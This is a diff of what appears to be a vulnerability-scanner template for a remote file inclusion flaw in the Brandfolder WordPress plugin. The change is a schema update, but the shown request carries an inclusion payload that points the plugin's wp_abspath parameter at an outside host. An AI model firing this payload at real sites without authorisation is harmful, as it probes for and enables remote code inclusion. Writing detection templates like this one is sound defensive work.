@@ -10,8 +10,10 @@ info:
     - https://www.exploit-db.com/exploits/39591
     - https://wpscan.com/vulnerability/f850e182-f9c6-4264-b2b1-e587447fe4b1
   tags: wp,brandfolder,edb,wpscan,wp-plugin,redirect,rfi,wordpress,lfi
+  metadata:
+    max-request: 1
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/"
